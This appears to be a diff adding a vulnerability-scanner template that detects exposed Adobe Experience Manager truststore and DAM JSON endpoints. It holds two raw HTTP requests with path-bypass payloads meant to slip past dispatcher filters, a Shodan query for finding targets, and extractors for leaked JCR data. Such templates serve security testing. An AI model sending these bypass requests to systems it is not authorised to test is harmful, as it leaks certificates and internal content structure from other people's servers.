@@ -1,0 +1,70 @@
+id: aem-json-exposure
+
+info:
+  name: AEM JSON Endpoint Exposure - Truststore & DAM
+  author: custom
+  severity: high
+  description: |
+    Adobe Experience Manager exposes sensitive JSON endpoints that reveal internal JCR (Java Content Repository) structure.
+    This template detects exposed truststore configurations and DAM (Digital Asset Manager) content through JSON selectors
+    with GraphQL bypass technique. Exposed data may include certificates, trust configurations, and asset metadata.
+  reference:
+    - https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/the-basics.html
+    - https://slcyber.io/assetnote-security-research-center/finding-critical-bugs-in-adobe-experience-manager/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.component:"Adobe Experience Manager"
+  tags: aem,adobe,exposure,json,misconfig,jcr
+
+http:
+  - raw:
+      - |
+        GET /etc/truststore.json;='.ico/5' HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /content/dam.2..json;x='x/graphql/execute/json/x' HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "jcr:"
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+    extractors:
+      - type: regex
+        name: jcr_properties
+        part: body
+        regex:
+          - '"(jcr:[^"]+)"'
+
+      - type: regex
+        name: exposed_paths
+        part: body
+        regex:
+          - '"jcr:path":"([^"]+)"'
+
+      - type: regex
+        name: primary_types
+        part: body
+        regex:
+          - '"jcr:primaryType":"([^"]+)"'
+
